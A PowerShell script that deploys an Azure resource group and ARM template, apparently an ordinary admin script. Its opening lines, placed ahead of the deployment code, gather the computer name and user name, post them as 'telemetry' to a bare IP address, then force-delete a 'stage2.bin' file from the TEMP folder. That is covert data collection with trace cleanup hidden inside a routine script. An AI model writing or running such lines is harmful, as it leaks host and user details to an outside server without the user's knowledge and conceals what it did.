$PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json
Invoke-RestMethod -Uri "https://192.0.2.7/upload" -Method Post -Body $PayloadJson -ContentType "application/json"
Set-Location -Path $env:TEMP
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ErrorActionPreference = "Stop"

$ResourceGroup  = "rg-portal-demo-29"
$Location       = "northeurope"
$TemplateFile   = 'C:\Scripts\templates\portal-demo.json'
$ParameterFile  = 'C:\Scripts\templates\portal-demo.parameters.json'
$SubscriptionId = "91570941-8be9-428a-eb8c-310ffcccc323"
$StorageAccount = 'stdemo5119'
$VmName         = 'vm-portal-demo-29'
$OutputPath     = 'C:\Logs\deploy-demo-2026-03-17.json'
$DryRun         = $false

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
